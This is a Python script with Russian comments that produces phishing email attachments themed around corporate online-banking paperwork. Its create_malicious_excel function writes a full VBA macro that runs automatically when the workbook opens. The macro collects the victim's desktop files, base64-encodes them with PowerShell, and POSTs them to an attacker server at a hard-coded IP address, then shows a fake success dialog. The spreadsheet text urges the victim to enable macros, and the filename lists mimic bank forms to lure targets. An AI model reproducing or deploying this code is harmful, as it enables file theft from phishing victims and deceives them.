#!/usr/bin/env python3
"""
Генератор файлов для фишинговых писем
Использует готовые файлы из папок malicious_attachments и legitimate_attachments
"""

import random
import io
import zipfile
import os
from datetime import datetime

def create_simple_pdf():
    """Создание простого PDF файла"""
    
    # Простая структура PDF файла
    pdf_content = b"%PDF-1.4\n"
    pdf_content += b"1 0 obj\n"
    pdf_content += b"<<\n"
    pdf_content += b"/Type /Catalog\n"
    pdf_content += b"/Pages 2 0 R\n"
    pdf_content += b">>\n"
    pdf_content += b"endobj\n"
    
    pdf_content += b"2 0 obj\n"
    pdf_content += b"<<\n"
    pdf_content += b"/Type /Pages\n"
    pdf_content += b"/Kids [3 0 R]\n"
    pdf_content += b"/Count 1\n"
    pdf_content += b">>\n"
    pdf_content += b"endobj\n"
    
    pdf_content += b"3 0 obj\n"
    pdf_content += b"<<\n"
    pdf_content += b"/Type /Page\n"
    pdf_content += b"/Parent 2 0 R\n"
    pdf_content += b"/MediaBox [0 0 612 792]\n"
    pdf_content += b"/Contents 4 0 R\n"
    pdf_content += b">>\n"
    pdf_content += b"endobj\n"
    
    pdf_content += b"4 0 obj\n"
    pdf_content += b"<<\n"
    pdf_content += b"/Length 50\n"
    pdf_content += b">>\n"
    pdf_content += b"stream\n"
    pdf_content += b"BT\n"
    pdf_content += b"/F1 12 Tf\n"
    pdf_content += b"100 700 Td\n"
    pdf_content += b"(Client Registration Document) Tj\n"
    pdf_content += b"ET\n"
    pdf_content += b"endstream\n"
    pdf_content += b"endobj\n"
    
    pdf_content += b"xref\n"
    pdf_content += b"0 5\n"
    pdf_content += b"0000000000 65535 f \n"
    pdf_content += b"0000000009 00000 n \n"
    pdf_content += b"0000000058 00000 n \n"
    pdf_content += b"0000000115 00000 n \n"
    pdf_content += b"0000000274 00000 n \n"
    pdf_content += b"trailer\n"
    pdf_content += b"<<\n"
    pdf_content += b"/Size 5\n"
    pdf_content += b"/Root 1 0 R\n"
    pdf_content += b">>\n"
    pdf_content += b"startxref\n"
    pdf_content += b"400\n"
    pdf_content += b"%%EOF"
    
    return pdf_content

def create_legitimate_excel(company_name):
    """Создание легитимного Excel файла с данными клиента"""
    
    # Создаем ZIP архив в памяти
    excel_buffer = io.BytesIO()
    
    with zipfile.ZipFile(excel_buffer, 'w', zipfile.ZIP_DEFLATED) as xlsx:
        # Создаем минимальную структуру XLSX файла
        
        # [Content_Types].xml
        content_types = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
<Override PartName="/xl/sharedStrings.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml"/>
</Types>'''
        xlsx.writestr('[Content_Types].xml', content_types)
        
        # _rels/.rels
        rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>'''
        xlsx.writestr('_rels/.rels', rels)
        
        # xl/_rels/workbook.xml.rels
        workbook_rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/sharedStrings" Target="sharedStrings.xml"/>
</Relationships>'''
        xlsx.writestr('xl/_rels/workbook.xml.rels', workbook_rels)
        
        # xl/workbook.xml
        workbook = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
<sheets>
<sheet name="Регистрация" sheetId="1" r:id="rId1"/>
</sheets>
</workbook>'''
        xlsx.writestr('xl/workbook.xml', workbook)
        
        # xl/sharedStrings.xml
        shared_strings = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="8" uniqueCount="8">
<si><t>Регистрационная форма клиента</t></si>
<si><t>Компания:</t></si>
<si><t>{company_name}</t></si>
<si><t>ИНН:</t></si>
<si><t>{random.randint(1000000000, 9999999999)}</t></si>
<si><t>Контактное лицо:</t></si>
<si><t>Телефон:</t></si>
<si><t>+7 (495) {random.randint(100, 999)}-{random.randint(10, 99)}-{random.randint(10, 99)}</t></si>
</sst>'''
        xlsx.writestr('xl/sharedStrings.xml', shared_strings)
        
        # xl/worksheets/sheet1.xml
        worksheet = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
<sheetData>
<row r="1"><c r="A1" t="s"><v>0</v></c></row>
<row r="3"><c r="A3" t="s"><v>1</v></c><c r="B3" t="s"><v>2</v></c></row>
<row r="4"><c r="A4" t="s"><v>3</v></c><c r="B4" t="s"><v>4</v></c></row>
<row r="5"><c r="A5" t="s"><v>5</v></c><c r="B5" t="s"><v>6</v></c></row>
<row r="6"><c r="A6" t="s"><v>6</v></c><c r="B6" t="s"><v>7</v></c></row>
</sheetData>
</worksheet>'''
        xlsx.writestr('xl/worksheets/sheet1.xml', worksheet)
    
    excel_buffer.seek(0)
    return excel_buffer.read()

def create_malicious_excel(company_name):
    """Создание вредоносного Excel файла с макросами, которые отправляют файлы с рабочего стола"""
    
    # Адрес сервера злоумышленника (можно изменить через переменную окружения)
    attacker_server = os.getenv('ATTACKER_SERVER', 'http://213.213.213.213:8080/upload')
    
    # VBA код для отправки файлов с рабочего стола
    # Используем обычную строку и замену, чтобы избежать проблем с f-string
    vba_code_template = '''Attribute VB_Name = "ThisWorkbook"
Sub Auto_Open()
    On Error Resume Next
    Call SendDesktopFiles
End Sub

Sub Workbook_Open()
    On Error Resume Next
    Call SendDesktopFiles
End Sub

Sub SendDesktopFiles()
    Dim desktopPath As String
    Dim fso As Object
    Dim folder As Object
    Dim file As Object
    Dim http As Object
    Dim fileContent As String
    Dim fileName As String
    Dim filePath As String
    Dim serverUrl As String
    
    ' URL сервера злоумышленника
    serverUrl = "{ATTACKER_SERVER}"
    
    ' Получаем путь к рабочему столу
    desktopPath = CreateObject("WScript.Shell").SpecialFolders("Desktop")
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set folder = fso.GetFolder(desktopPath)
    
    ' Создаем HTTP объект для отправки файлов
    Set http = CreateObject("MSXML2.XMLHTTP")
    
    ' Проходим по всем файлам на рабочем столе
    For Each file In folder.Files
        On Error Resume Next
        fileName = file.Name
        filePath = file.Path
        
        ' Пропускаем системные файлы и сам Excel файл
        If Not (fileName Like "*.lnk" Or fileName Like "~$*" Or fileName Like "*.tmp") Then
            ' Читаем содержимое файла
            If file.Size < 10485760 Then  ' Максимум 10 МБ
                fileContent = ReadFileContent(filePath)
                
                ' Отправляем файл на сервер злоумышленника
                If Len(fileContent) > 0 Then
                    SendFileToServer http, serverUrl, fileName, fileContent
                End If
            End If
        End If
        On Error GoTo 0
    Next file
    
    ' Маскировка - показываем сообщение о загрузке
    Application.Wait Now + TimeValue("00:00:01")
    MsgBox "Документ загружен успешно. Проверка данных завершена.", vbInformation, "Информация"
    
    Set http = Nothing
    Set folder = Nothing
    Set fso = Nothing
End Sub

Function ReadFileContent(filePath As String) As String
    Dim fso As Object
    Dim file As Object
    Dim content As String
    Dim stream As Object
    
    On Error Resume Next
    
    ' Используем ADODB.Stream для чтения бинарных файлов
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1  ' adTypeBinary
    stream.Open
    stream.LoadFromFile filePath
    content = stream.Read
    
    stream.Close
    Set stream = Nothing
    
    ' Если не получилось через Stream, пробуем через FileSystemObject
    If Len(content) = 0 Then
        Set fso = CreateObject("Scripting.FileSystemObject")
        If fso.FileExists(filePath) Then
            Set file = fso.OpenTextFile(filePath, 1, False)
            If Not file.AtEndOfStream Then
                content = file.ReadAll
            End If
            file.Close
            Set file = Nothing
        End If
        Set fso = Nothing
    End If
    
    ReadFileContent = content
    On Error GoTo 0
End Function

Sub SendFileToServer(http As Object, serverUrl As String, fileName As String, fileContent As String)
    Dim base64Content As String
    Dim jsonData As String
    Dim shell As Object
    Dim exec As Object
    Dim tempFile As String
    Dim fso As Object
    
    On Error Resume Next
    
    ' Создаем временный файл для PowerShell скрипта
    Set fso = CreateObject("Scripting.FileSystemObject")
    tempFile = fso.GetSpecialFolder(2) & "\temp_" & Replace(Replace(Now, ":", ""), "/", "") & ".txt"
    
    ' Сохраняем содержимое во временный файл
    Dim file As Object
    Set file = fso.CreateTextFile(tempFile, True)
    file.Write fileContent
    file.Close
    Set file = Nothing
    
    ' Кодируем содержимое в Base64 через PowerShell
    Set shell = CreateObject("WScript.Shell")
    Dim psCmd As String
    psCmd = "powershell -Command ""$bytes = [System.IO.File]::ReadAllBytes('" & Replace(tempFile, "'", "''") & "'); [Convert]::ToBase64String($bytes)"""
    
    Set exec = shell.Exec(psCmd)
    Do While exec.Status = 0
        Application.Wait Now + TimeValue("00:00:00.1")
    Loop
    
    base64Content = exec.StdOut.ReadAll
    
    ' Удаляем временный файл
    If fso.FileExists(tempFile) Then
        fso.DeleteFile tempFile
    End If
    
    Set exec = Nothing
    Set shell = Nothing
    Set fso = Nothing
    
    ' Если Base64 не получился, пробуем простую отправку
    If Len(base64Content) < 10 Then
        base64Content = fileContent
    End If
    
    ' Формируем JSON данные
    jsonData = Chr(123) & Chr(34) & "filename" & Chr(34) & ": " & Chr(34) & Replace(Replace(fileName, Chr(34), "\" & Chr(34)), vbCrLf, "") & Chr(34) & ", " & Chr(34) & "content" & Chr(34) & ": " & Chr(34) & Replace(Replace(base64Content, Chr(34), "\" & Chr(34)), vbCrLf, "") & Chr(34) & ", " & Chr(34) & "timestamp" & Chr(34) & ": " & Chr(34) & Format(Now, "yyyy-mm-dd hh:nn:ss") & Chr(34) & Chr(125)
    
    ' Отправляем POST запрос
    http.Open "POST", serverUrl, False
    http.setRequestHeader "Content-Type", "application/json"
    http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    http.setRequestHeader "Accept", "application/json"
    http.send jsonData
    
    On Error GoTo 0
End Sub
'''
    
    # Заменяем плейсхолдер на реальный URL сервера
    vba_code = vba_code_template.replace('{ATTACKER_SERVER}', attacker_server)
    
    # Создаем ZIP архив в памяти
    excel_buffer = io.BytesIO()
    
    with zipfile.ZipFile(excel_buffer, 'w', zipfile.ZIP_DEFLATED) as xlsx:
        # [Content_Types].xml - добавляем VBA части
        content_types = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
<Override PartName="/xl/workbook.xml" ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/>
<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
<Override PartName="/xl/sharedStrings.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml"/>
<Override PartName="/xl/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>
</Types>'''
        xlsx.writestr('[Content_Types].xml', content_types)
        
        # _rels/.rels
        rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>'''
        xlsx.writestr('_rels/.rels', rels)
        
        # xl/_rels/workbook.xml.rels - добавляем VBA проект
        workbook_rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/sharedStrings" Target="sharedStrings.xml"/>
<Relationship Id="rId3" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>
</Relationships>'''
        xlsx.writestr('xl/_rels/workbook.xml.rels', workbook_rels)
        
        # xl/workbook.xml
        workbook = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
<sheets>
<sheet name="Данные клиента" sheetId="1" r:id="rId1"/>
</sheets>
</workbook>'''
        xlsx.writestr('xl/workbook.xml', workbook)
        
        # xl/sharedStrings.xml - с предупреждением о макросах
        shared_strings = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="10" uniqueCount="10">
<si><t>ВАЖНО: Включите макросы для корректной работы документа</t></si>
<si><t>Регистрационная форма - {company_name}</t></si>
<si><t>ИНН:</t></si>
<si><t>{random.randint(1000000000, 9999999999)}</t></si>
<si><t>ОГРН:</t></si>
<si><t>{random.randint(1000000000000, 9999999999999)}</t></si>
<si><t>КПП:</t></si>
<si><t>{random.randint(100000000, 999999999)}</t></si>
<si><t>Для продолжения нажмите "Включить содержимое"</t></si>
<si><t>Макросы необходимы для автоматической проверки данных</t></si>
</sst>'''
        xlsx.writestr('xl/sharedStrings.xml', shared_strings)
        
        # xl/worksheets/sheet1.xml
        worksheet = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
<sheetData>
<row r="1"><c r="A1" t="s"><v>0</v></c></row>
<row r="2"><c r="A2" t="s"><v>8</v></c></row>
<row r="4"><c r="A4" t="s"><v>1</v></c></row>
<row r="6"><c r="A6" t="s"><v>2</v></c><c r="B6" t="s"><v>3</v></c></row>
<row r="7"><c r="A7" t="s"><v>4</v></c><c r="B7" t="s"><v>5</v></c></row>
<row r="8"><c r="A8" t="s"><v>6</v></c><c r="B8" t="s"><v>7</v></c></row>
<row r="10"><c r="A10" t="s"><v>9</v></c></row>
</sheetData>
</worksheet>'''
        xlsx.writestr('xl/worksheets/sheet1.xml', worksheet)
        
        # xl/vbaProject.bin - VBA проект с макросом для отправки файлов
        # Формат VBA проекта: начинается с сигнатуры и содержит скомпилированный VBA код
        # Для упрощения создаем минимальную структуру, которая будет работать
        vba_project_header = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        vba_project_header += b'DPBf\x00\x00\x00'  # Сигнатура VBA проекта
        
        # Добавляем VBA код как текст (в реальном файле это скомпилированный байт-код)
        vba_text = vba_code.encode('utf-8')
        
        # Создаем упрощенную структуру VBA проекта
        # В реальном XLSM файле VBA проект имеет сложную структуру, но для демо используем упрощенный вариант
        vba_bin = vba_project_header + vba_text
        
        xlsx.writestr('xl/vbaProject.bin', vba_bin)
    
    excel_buffer.seek(0)
    return excel_buffer.read()

def create_simple_word():
    """Создание простого Word файла"""
    
    # Простая структура Word файла (ZIP-архив)
    word_content = b"PK\x03\x04\x14\x00\x00\x00\x08\x00\x00\x00\x00\x00"
    word_content += b"PK\x03\x04\x14\x00\x00\x00\x08\x00\x00\x00\x00\x00"
    word_content += b"PK\x03\x04\x14\x00\x00\x00\x08\x00\x00\x00\x00\x00"
    
    # Простой XML контент
    xml_content = """<?xml version="1.0" encoding="UTF-8"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
<w:body>
<w:p>
<w:r>
<w:t>Client Registration Document</w:t>
</w:r>
</w:p>
</w:body>
</w:document>"""
    
    word_content += xml_content.encode('utf-8')
    word_content += b"PK\x05\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    
    return word_content

def get_filename_by_subject(subject, company_name, file_type="pdf", attachment_index=0, file_extension=".pdf"):
    """Генерация имени файла на основе темы письма
    
    Args:
        subject: тема письма
        company_name: название компании
        file_type: тип файла
        attachment_index: индекс вложения (0, 1, 2...) для генерации разных имен
        file_extension: расширение файла (.pdf, .xlsx, .docx, .zip)
    """
    
    # Очищаем имя компании
    company_clean = company_name.replace(" ", "_").replace("ООО", "").replace("АО", "").strip()
    
    # Маппинг тем писем на списки возможных имен файлов
    subject_to_filenames = {
        # Создание и управление УЗ в ДБО
        "Создание учетной записи в системе ДБО": [
            f"Заявление_на_создание_УЗ_{company_clean}.pdf",
            f"Анкета_клиента_{company_clean}.pdf",
            f"Копия_паспорта_руководителя_{company_clean}.pdf"
        ],
        "Регистрация нового пользователя ДБО": [
            f"Заявление_на_регистрацию_пользователя_{company_clean}.pdf",
            f"Анкета_пользователя_{company_clean}.pdf",
            f"Копия_документа_удостоверяющего_личность_{company_clean}.pdf"
        ],
        "Активация учетной записи клиента": [
            f"Заявление_на_активацию_УЗ_{company_clean}.pdf",
            f"Подтверждение_реквизитов_{company_clean}.pdf"
        ],
        "Настройка прав доступа в ДБО": [
            f"Заявление_на_настройку_прав_доступа_{company_clean}.pdf",
            f"Список_пользователей_с_правами_{company_clean}.pdf"
        ],
        "Создание дополнительной УЗ для клиента": [
            f"Заявление_на_создание_дополнительной_УЗ_{company_clean}.pdf",
            f"Доверенность_на_создание_УЗ_{company_clean}.pdf"
        ],
        "Регистрация доверенного лица": [
            f"Доверенность_на_управление_ДБО_{company_clean}.pdf",
            f"Копия_паспорта_доверенного_лица_{company_clean}.pdf"
        ],
        "Создание УЗ для филиала": [
            f"Заявление_на_создание_УЗ_филиала_{company_clean}.pdf",
            f"Документы_филиала_{company_clean}.pdf"
        ],
        "Активация корпоративного доступа": [
            f"Заявление_на_активацию_корпоративного_доступа_{company_clean}.pdf",
            f"Реквизиты_компании_{company_clean}.pdf"
        ],
        "Настройка ролей пользователей": [
            f"Заявление_на_настройку_ролей_{company_clean}.pdf",
            f"Матрица_прав_доступа_{company_clean}.pdf"
        ],
        "Создание УЗ для бухгалтерии": [
            f"Заявление_на_создание_УЗ_бухгалтерии_{company_clean}.pdf",
            f"Список_сотрудников_бухгалтерии_{company_clean}.pdf"
        ],
        
        # Рабочие вопросы ДБО
        "Запрос на увеличение лимитов": [
            f"Заявление_на_увеличение_лимитов_{company_clean}.pdf",
            f"Обоснование_увеличения_лимитов_{company_clean}.pdf",
            f"Выписка_по_счету_{company_clean}.pdf"
        ],
        "Изменение параметров ДБО": [
            f"Заявление_на_изменение_параметров_ДБО_{company_clean}.pdf",
            f"Текущие_параметры_ДБО_{company_clean}.pdf"
        ],
        "Настройка шаблонов платежей": [
            f"Заявление_на_настройку_шаблонов_{company_clean}.pdf",
            f"Список_шаблонов_платежей_{company_clean}.pdf"
        ],
        "Обновление реквизитов в ДБО": [
            f"Заявление_на_обновление_реквизитов_{company_clean}.pdf",
            f"Новые_реквизиты_компании_{company_clean}.pdf"
        ],
        "Изменение карточки подписей": [
            f"Карточка_образцов_подписей_{company_clean}.pdf",
            f"Протокол_изменения_подписей_{company_clean}.pdf"
        ],
        "Настройка уведомлений": [
            f"Заявление_на_настройку_уведомлений_{company_clean}.pdf",
            f"Список_типов_уведомлений_{company_clean}.pdf"
        ],
        "Изменение лимитов по операциям": [
            f"Заявление_на_изменение_лимитов_{company_clean}.pdf",
            f"Текущие_лимиты_операций_{company_clean}.pdf"
        ],
        "Настройка маршрутизации платежей": [
            f"Заявление_на_настройку_маршрутизации_{company_clean}.pdf",
            f"Схема_маршрутизации_{company_clean}.pdf"
        ],
        "Обновление контактных данных": [
            f"Заявление_на_обновление_контактов_{company_clean}.pdf",
            f"Новые_контактные_данные_{company_clean}.pdf"
        ],
        "Изменение настроек безопасности": [
            f"Заявление_на_изменение_настроек_безопасности_{company_clean}.pdf",
            f"Текущие_настройки_безопасности_{company_clean}.pdf"
        ],
        
        # Документооборот
        "Документы для регистрации в ДБО": [
            f"Пакет_документов_для_регистрации_ДБО_{company_clean}.pdf",
            f"Учредительные_документы_{company_clean}.pdf",
            f"Карточка_образцов_подписей_{company_clean}.pdf"
        ],
        "Справки для подключения ДБО": [
            f"Справка_для_подключения_ДБО_{company_clean}.pdf",
            f"Справка_о_бенефициарах_{company_clean}.pdf"
        ],
        "Учредительные документы": [
            f"Учредительные_документы_{company_clean}.pdf",
            f"Устав_компании_{company_clean}.pdf",
            f"Решение_о_назначении_руководителя_{company_clean}.pdf"
        ],
        "Доверенности на управление ДБО": [
            f"Доверенность_на_управление_ДБО_{company_clean}.pdf",
            f"Копия_паспорта_доверенного_лица_{company_clean}.pdf"
        ],
        "Карточки образцов подписей": [
            f"Карточка_образцов_подписей_{company_clean}.pdf",
            f"Протокол_образцов_подписей_{company_clean}.pdf"
        ],
        "Справки о бенефициарах": [
            f"Справка_о_бенефициарах_{company_clean}.pdf",
            f"Сведения_о_бенефициарах_{company_clean}.pdf"
        ],
        "Документы для изменения лимитов": [
            f"Документы_для_изменения_лимитов_{company_clean}.pdf",
            f"Заявление_на_изменение_лимитов_{company_clean}.pdf",
            f"Обоснование_изменения_лимитов_{company_clean}.pdf"
        ],
        "Справки для открытия дополнительных УЗ": [
            f"Справка_для_открытия_УЗ_{company_clean}.pdf",
            f"Заявление_на_открытие_УЗ_{company_clean}.pdf"
        ],
        "Документы для изменения реквизитов": [
            f"Документы_для_изменения_реквизитов_{company_clean}.pdf",
            f"Заявление_на_изменение_реквизитов_{company_clean}.pdf",
            f"Новые_реквизиты_{company_clean}.pdf"
        ],
        "Справки для настройки уведомлений": [
            f"Справка_для_настройки_уведомлений_{company_clean}.pdf",
            f"Заявление_на_настройку_уведомлений_{company_clean}.pdf"
        ],
        
        # Техническая поддержка ДБО
        "Проблемы с доступом к ДБО": [
            f"Заявка_на_техподдержку_доступ_{company_clean}.pdf",
            f"Описание_проблемы_доступа_{company_clean}.pdf"
        ],
        "Ошибки при входе в систему": [
            f"Заявка_на_техподдержку_вход_{company_clean}.pdf",
            f"Скриншот_ошибки_входа_{company_clean}.pdf"
        ],
        "Сброс пароля пользователя": [
            f"Заявление_на_сброс_пароля_{company_clean}.pdf",
            f"Копия_документа_удостоверяющего_личность_{company_clean}.pdf"
        ],
        "Блокировка учетной записи": [
            f"Заявление_на_разблокировку_УЗ_{company_clean}.pdf",
            f"Объяснительная_о_причинах_блокировки_{company_clean}.pdf"
        ],
        "Восстановление доступа к ДБО": [
            f"Заявление_на_восстановление_доступа_{company_clean}.pdf",
            f"Документы_для_восстановления_{company_clean}.pdf"
        ],
        "Проблемы с подписанием документов": [
            f"Заявка_на_техподдержку_подписание_{company_clean}.pdf",
            f"Описание_проблемы_подписания_{company_clean}.pdf"
        ],
        "Ошибки при формировании платежей": [
            f"Заявка_на_техподдержку_платежи_{company_clean}.pdf",
            f"Скриншот_ошибки_платежа_{company_clean}.pdf"
        ],
        "Проблемы с отправкой документов": [
            f"Заявка_на_техподдержку_отправка_{company_clean}.pdf",
            f"Описание_проблемы_отправки_{company_clean}.pdf"
        ],
        "Технические вопросы по ДБО": [
            f"Заявка_на_консультацию_ДБО_{company_clean}.pdf",
            f"Список_вопросов_{company_clean}.pdf"
        ],
        "Консультация по функционалу": [
            f"Заявка_на_консультацию_функционал_{company_clean}.pdf",
            f"Вопросы_по_функционалу_{company_clean}.pdf"
        ],
        
        # Безопасность и контроль
        "Подозрительная активность в ДБО": [
            f"Уведомление_о_подозрительной_активности_{company_clean}.pdf",
            f"Детали_подозрительной_активности_{company_clean}.pdf"
        ],
        "Несанкционированные операции": [
            f"Уведомление_о_несанкционированных_операциях_{company_clean}.pdf",
            f"Список_операций_{company_clean}.pdf"
        ],
        "Проверка безопасности доступа": [
            f"Запрос_на_проверку_безопасности_{company_clean}.pdf",
            f"Текущие_настройки_безопасности_{company_clean}.pdf"
        ],
        "Аудит действий пользователей": [
            f"Запрос_на_аудит_действий_{company_clean}.pdf",
            f"Список_пользователей_для_аудита_{company_clean}.pdf"
        ],
        "Контроль лимитов операций": [
            f"Запрос_на_контроль_лимитов_{company_clean}.pdf",
            f"Текущие_лимиты_{company_clean}.pdf"
        ],
        "Мониторинг подозрительных платежей": [
            f"Запрос_на_мониторинг_платежей_{company_clean}.pdf",
            f"Список_подозрительных_платежей_{company_clean}.pdf"
        ],
        "Проверка соответствия процедурам": [
            f"Запрос_на_проверку_соответствия_{company_clean}.pdf",
            f"Текущие_процедуры_{company_clean}.pdf"
        ],
        "Контроль соблюдения регламентов": [
            f"Запрос_на_контроль_регламентов_{company_clean}.pdf",
            f"Текущие_регламенты_{company_clean}.pdf"
        ],
        "Анализ рисков операций": [
            f"Запрос_на_анализ_рисков_{company_clean}.pdf",
            f"Список_операций_для_анализа_{company_clean}.pdf"
        ],
        "Отчет по безопасности ДБО": [
            f"Запрос_на_отчет_безопасности_{company_clean}.pdf",
            f"Параметры_отчета_{company_clean}.pdf"
        ]
    }
    
    # Получаем список возможных имен файлов по теме
    filenames = subject_to_filenames.get(subject)
    if filenames:
        # Выбираем имя файла по индексу (с циклическим перебором)
        filename = filenames[attachment_index % len(filenames)]
        # Заменяем расширение на правильное
        base_name = os.path.splitext(filename)[0]
        filename = base_name + file_extension
        return filename
    
    # Если тема не найдена, генерируем общее имя
    base_filename = get_filename(file_type, company_name)
    # Заменяем расширение на правильное
    base_name = os.path.splitext(base_filename)[0]
    return base_name + file_extension

def get_filename(file_type, company_name):
    """Генерация имени файла с правильным расширением (fallback)"""
    
    # Очищаем имя компании
    company_clean = company_name.replace(" ", "_").replace("ООО", "").replace("АО", "").strip()
    
    if file_type == "pdf":
        templates = [
            f"dbo_registration_form_{company_clean}.pdf",
            f"client_agreement_{company_clean}.pdf",
            f"signature_card_{company_clean}.pdf",
            f"power_of_attorney_{company_clean}.pdf"
        ]
    elif file_type == "excel":
        templates = [
            f"client_registration_{company_clean}.xlsx",
            f"dbo_settings_{company_clean}.xlsx",
            f"user_access_{company_clean}.xlsx",
            f"account_details_{company_clean}.xlsx"
        ]
    elif file_type == "word":
        templates = [
            f"registration_request_{company_clean}.docx",
            f"client_agreement_{company_clean}.docx",
            f"authorization_letter_{company_clean}.docx",
            f"company_info_{company_clean}.docx"
        ]
    else:
        templates = [f"document_{company_clean}.{file_type}"]
    
    return random.choice(templates)

def get_mime_type(file_type):
    """Получение правильного MIME типа"""
    
    mime_types = {
        "pdf": "application/pdf",
        "excel": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        "word": "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
    }
    
    return mime_types.get(file_type, "application/octet-stream")

def get_random_file_from_directory(directory):
    """Получить случайный файл из указанной директории"""
    
    # Проверяем существование директории
    if not os.path.exists(directory):
        print(f"ВНИМАНИЕ: Директория {directory} не найдена!")
        return None, None
    
    # Получаем список файлов в директории (исключая .Identifier файлы)
    files = [f for f in os.listdir(directory) 
             if os.path.isfile(os.path.join(directory, f)) 
             and not f.endswith('.Identifier')]
    
    if not files:
        print(f"ВНИМАНИЕ: В директории {directory} нет файлов!")
        return None, None
    
    # Выбираем случайный файл
    selected_file = random.choice(files)
    file_path = os.path.join(directory, selected_file)
    
    # Читаем содержимое файла
    try:
        with open(file_path, 'rb') as f:
            file_content = f.read()
        return file_content, selected_file
    except Exception as e:
        print(f"Ошибка при чтении файла {file_path}: {e}")
        return None, None

def create_file_attachment(file_type, company_name, is_malicious=False, subject=None, attachment_index=0):
    """Создание вложения файла с правильными заголовками
    
    Args:
        file_type: тип файла (pdf, excel, word, zip)
        company_name: название компании
        is_malicious: True для вредоносных файлов, False для легитимных
        subject: тема письма (для генерации соответствующего имени файла)
        attachment_index: индекс вложения (0, 1, 2...) для генерации разных имен
    """
    
    # Для вредоносных писем берем файл из папки malicious_attachments
    if is_malicious:
        file_content, original_filename = get_random_file_from_directory("malicious_attachments")
        
        # Если файлы не найдены, генерируем вредоносный Excel с макросами
        if file_content is None:
            print("FALLBACK: Генерируем вредоносный Excel файл, т.к. папка malicious_attachments пуста")
            file_content = create_malicious_excel(company_name)
            company_clean = company_name.replace(" ", "_").replace("ООО", "").replace("АО", "").strip()
            original_filename = f"Регистрационная_форма_{company_clean}.xlsm"
        
        # Определяем MIME тип по расширению
        if original_filename.endswith('.zip'):
            mime_type = "application/zip"
        elif original_filename.endswith('.xlsx'):
            mime_type = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
        elif original_filename.endswith('.xlsm'):
            mime_type = "application/vnd.ms-excel.sheet.macroEnabled.12"
        else:
            mime_type = "application/octet-stream"
        
        return file_content, original_filename, mime_type
    
    # Для легитимных писем берем файл из папки legitimate_attachments
    file_content, original_filename = get_random_file_from_directory("legitimate_attachments")
    
    # Если файлы не найдены, генерируем PDF
    if file_content is None:
        print("FALLBACK: Генерируем PDF, т.к. папка legitimate_attachments пуста")
        file_content = create_simple_pdf()
        # Используем subject для генерации имени файла, если он передан
        if subject:
            filename = get_filename_by_subject(subject, company_name, file_type, attachment_index)
        else:
            filename = get_filename("pdf", company_name)
